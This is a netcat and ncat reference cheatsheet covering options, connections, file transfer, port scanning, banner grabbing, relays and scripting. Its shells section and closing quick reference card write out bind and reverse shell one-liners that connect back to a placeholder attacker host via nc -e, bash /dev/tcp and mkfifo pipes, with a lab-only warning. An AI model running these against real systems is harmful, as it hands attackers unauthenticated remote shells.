# Netcat Cheatsheet

> A comprehensive reference for `nc` (netcat) — the "Swiss Army knife" of networking, used for reading, writing, and redirecting data across network connections.

---

## Table of Contents

- [Basic Syntax](#basic-syntax)
- [Versions of Netcat](#versions-of-netcat)
- [Common Options](#common-options)
- [Connecting to a Host](#connecting-to-a-host)
- [Listening Mode](#listening-mode)
- [File Transfer](#file-transfer)
- [Port Scanning](#port-scanning)
- [Banners & Service Info](#banners--service-info)
- [Chat / Messaging](#chat--messaging)
- [Proxies & Relays](#proxies--relays)
- [Shells & Remote Access](#shells--remote-access)
- [UDP Mode](#udp-mode)
- [Timeouts & Keep-Alive](#timeouts--keep-alive)
- [Practical Examples](#practical-examples)
- [Quick Reference Card](#quick-reference-card)

---

## Basic Syntax

```
nc [options] host port         # client mode — connect to host:port
nc [options] -l [host] port    # server mode — listen on port
```

- Data flows **both ways** between stdin/stdout and the network
- Exit with `Ctrl+C` or `Ctrl+D` (EOF)

---

## Versions of Netcat

There are several implementations with slightly different flags:

| Version | Binary | Notes |
|---|---|---|
| GNU netcat | `nc` or `netcat` | Classic; `-e` flag available |
| OpenBSD netcat | `nc` | Most common on modern Linux/macOS; no `-e` |
| ncat (Nmap) | `ncat` | Feature-rich; SSL support, `--exec` flag |
| netcat-traditional | `nc.traditional` | Debian/Ubuntu legacy package |

> Check your version: `nc -h 2>&1 | head -5`  
> On Debian/Ubuntu: `update-alternatives --list nc`

---

## Common Options

| Option | Description |
|---|---|
| `-l` | Listen mode (server) |
| `-p port` | Local port to use |
| `-u` | Use UDP instead of TCP |
| `-v` | Verbose output |
| `-vv` | Very verbose |
| `-n` | Numeric only — skip DNS resolution |
| `-z` | Zero-I/O mode — scan only, send no data |
| `-w secs` | Timeout for idle connections |
| `-k` | Keep listening after client disconnects (OpenBSD) |
| `-4` | Force IPv4 |
| `-6` | Force IPv6 |
| `-e cmd` | Execute command after connect (GNU/traditional) |
| `-c cmd` | Execute command via `/bin/sh` (GNU) |
| `-s addr` | Source address to use |
| `-q secs` | Quit after EOF on stdin, after delay (GNU) |
| `-N` | Shutdown on EOF (OpenBSD) |
| `-x addr:port` | Use SOCKS4/5 proxy |

---

## Connecting to a Host

```bash
# Basic TCP connection
nc host 80

# Connect with verbose output
nc -v host 22

# Connect without DNS lookup
nc -nv 192.168.1.1 80

# Connect using IPv6
nc -6 ::1 8080

# Connect via specific source address
nc -s 192.168.1.50 target.host 80

# Connect with a timeout (5 seconds)
nc -w 5 host 80
```

---

## Listening Mode

```bash
# Listen on a port (server)
nc -l 4444

# Listen with verbose output
nc -lv 4444

# Listen on a specific address
nc -l 127.0.0.1 4444

# Keep listening after a client disconnects (OpenBSD)
nc -lk 4444

# Listen on UDP port
nc -lu 5000

# Specify local port explicitly (GNU netcat style)
nc -l -p 4444
```

---

## File Transfer

Netcat has no built-in encryption — use only on trusted networks or tunnel through SSH.

### Send a File

```bash
# Receiver — listens and saves to file
nc -l 4444 > received_file.txt

# Sender — connects and sends file
nc host 4444 < file_to_send.txt
```

### Send with Progress (using pv)

```bash
# Receiver
nc -l 4444 > received_file.iso

# Sender — shows progress bar
pv file.iso | nc host 4444
```

### Send a Directory (tar)

```bash
# Receiver — extracts received archive
nc -l 4444 | tar xzvf -

# Sender — compresses and sends directory
tar czvf - /path/to/dir | nc host 4444
```

### Send with Completion Notification

```bash
# Receiver — saves file and confirms when done
nc -l 4444 > file.txt && echo "Transfer complete"

# Sender — quits after EOF (GNU)
nc -q 1 host 4444 < file.txt
# or (OpenBSD)
nc -N host 4444 < file.txt
```

---

## Port Scanning

> For serious port scanning, prefer `nmap`. Netcat's scanner is simple but handy for quick checks.

```bash
# Scan a single port
nc -zv host 80

# Scan a range of ports
nc -zv host 20-100

# Scan multiple specific ports
nc -zv host 22 80 443 8080

# Scan UDP ports
nc -zvu host 53

# Fast scan with short timeout (no DNS)
nc -znv -w 1 host 1-1024

# Script-friendly: check if port is open
nc -z host 443 && echo "open" || echo "closed"
```

---

## Banners & Service Info

Grabbing a service banner helps identify what software is running on an open port.

```bash
# HTTP banner
echo "HEAD / HTTP/1.0\r\n\r\n" | nc -w 5 host 80

# Full HTTP GET request
printf "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc host 80

# HTTPS (via ncat with SSL)
ncat --ssl host 443

# SMTP banner
nc -w 5 host 25

# FTP banner
nc -w 5 host 21

# SSH banner
nc -w 5 host 22

# Check a web server's headers only
echo -e "HEAD / HTTP/1.0\n\n" | nc host 80 | head -20
```

---

## Chat / Messaging

Netcat can act as a simple two-way chat tool between two machines.

```bash
# Host A — listens
nc -lv 4444

# Host B — connects
nc -v hostA 4444

# Both sides can now type messages back and forth.
# Ctrl+D or Ctrl+C to exit.
```

---

## Proxies & Relays

### Simple TCP Relay (using named pipe)

```bash
# Forward all traffic from port 8080 to example.com:80
mkfifo /tmp/relay
nc -lk 8080 < /tmp/relay | nc example.com 80 > /tmp/relay
```

### Port Forwarding with ncat

```bash
# ncat has built-in proxy / broker support
ncat -l 8080 --sh-exec "ncat example.com 80"

# Broker mode — allows multiple clients to talk to each other
ncat -l 4444 --broker
```

### SOCKS Proxy

```bash
# Connect through a SOCKS4 proxy
nc -x proxy_host:1080 target_host 80

# Connect through a SOCKS5 proxy
nc -X 5 -x proxy_host:1080 target_host 80
```

---

## Shells & Remote Access

> ⚠️ **Security Warning:** Bind and reverse shells expose full shell access with no authentication or encryption. Use only in isolated lab environments or authorised penetration tests.

### Bind Shell (listener runs the shell)

```bash
# Victim / server — binds a shell to a port (GNU netcat)
nc -lvp 4444 -e /bin/bash

# Attacker / client — connects to get shell
nc victim_ip 4444
```

### Reverse Shell (target connects back)

```bash
# Attacker — listens for incoming connection
nc -lvp 4444

# Victim — connects back and sends shell (GNU netcat)
nc attacker_ip 4444 -e /bin/bash
```

### Reverse Shell Without `-e` (OpenBSD netcat)

```bash
# Using bash's built-in /dev/tcp
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Using mkfifo
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# Using sh and named pipe
rm -f /tmp/p; mkfifo /tmp/p
/bin/sh -i < /tmp/p 2>&1 | nc attacker_ip 4444 > /tmp/p
```

### ncat with SSL (encrypted shell)

```bash
# Listener (attacker) with SSL
ncat --ssl -lvp 4444

# Connector (victim) with SSL + exec
ncat --ssl attacker_ip 4444 -e /bin/bash
```

---

## UDP Mode

```bash
# Listen on UDP port
nc -lu 5000

# Send data over UDP
echo "hello" | nc -u host 5000

# UDP port scan
nc -zuv host 53 123 161

# UDP chat
# Host A:
nc -lu 5000
# Host B:
nc -u hostA 5000
```

> **Note:** UDP has no connection state — `nc -z` on UDP may show ports as open even if nothing is listening.

---

## Timeouts & Keep-Alive

```bash
# Timeout after 10 seconds of inactivity
nc -w 10 host 80

# Keep listener alive between connections (OpenBSD)
nc -lk 4444

# Quit n seconds after EOF on stdin (GNU)
nc -q 2 host 80 < request.txt

# Close connection after sending data (OpenBSD)
nc -N host 80 < request.txt
```

---

## Practical Examples

### Web & HTTP

```bash
# Manual HTTP request
printf "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" \
  | nc example.com 80

# Check if a web server is alive
nc -zw 3 example.com 80 && echo "up" || echo "down"

# Crude HTTP server serving a single file (loops with bash)
while true; do nc -lp 8080 < index.html; done

# Send a POST request
printf "POST /api HTTP/1.1\r\nHost: host\r\nContent-Length: 13\r\n\r\nhello=world!!" \
  | nc host 80
```

### Network Diagnostics

```bash
# Test if a TCP port is reachable
nc -zv 192.168.1.1 22

# Check multiple ports quickly
for port in 22 80 443 3306 5432; do
  nc -zw 1 host $port && echo "$port open" || echo "$port closed"
done

# Measure connection latency (rough)
time nc -zw 1 host 80

# Test firewall rules between two hosts
# Server:
nc -lv 9999
# Client:
nc -v server_ip 9999
```

### SSL / TLS (with ncat)

```bash
# Connect to HTTPS
ncat --ssl example.com 443

# Manual HTTPS request
printf "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | ncat --ssl example.com 443

# Start a simple SSL listener
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -l 4443
```

### Database & Services

```bash
# Test MySQL port
nc -zv db_host 3306

# Test PostgreSQL port
nc -zv db_host 5432

# Test Redis
echo "PING" | nc -w 1 host 6379

# Test Memcached
echo "stats" | nc host 11211

# Send a raw DNS query (UDP)
echo -ne '\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' | nc -u dns_server 53
```

### Scripting & Automation

```bash
# Check a list of hosts/ports from a file
while IFS=: read host port; do
  nc -zw 1 "$host" "$port" \
    && echo "$host:$port OPEN" \
    || echo "$host:$port CLOSED"
done < hosts.txt

# Wait until a port becomes available
until nc -zw 1 host 5432 2>/dev/null; do
  echo "Waiting for database..."; sleep 2
done
echo "Database is up"

# Simple health check loop
while true; do
  nc -zw 2 host 80 || echo "$(date): host DOWN"
  sleep 30
done
```

---

## Quick Reference Card

```
nc [options] host port      connect (client)
nc -l [options] port        listen  (server)

CONNECTION                  I/O CONTROL
  -v    verbose               -q n  quit after n secs (GNU)
  -n    no DNS                -N    close on EOF (OpenBSD)
  -w n  timeout secs          -k    keep listening
  -4    IPv4 only
  -6    IPv6 only             PROTOCOL
  -s    source address          -u  UDP mode
  -p    local port              -z  scan / zero I/O
                                -x  SOCKS proxy

SHELLS (GNU / traditional)
  nc -lvp 4444 -e /bin/bash           bind shell (listener)
  nc attacker 4444 -e /bin/bash       reverse shell

WITHOUT -e (OpenBSD)
  bash -i >& /dev/tcp/host/4444 0>&1  reverse shell via bash
  mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc host 4444 >/tmp/f

FILE TRANSFER
  nc -l 4444 > out.txt                receive
  nc host 4444 < in.txt               send
  tar czf - dir/ | nc host 4444       send directory
  nc -l 4444 | tar xzf -              receive directory
```

---

> **Further Reading:**
> - `man nc` or `man ncat`
> - `nc -h` for your local version's flags
> - [ncat — Nmap reference guide](https://nmap.org/ncat/)
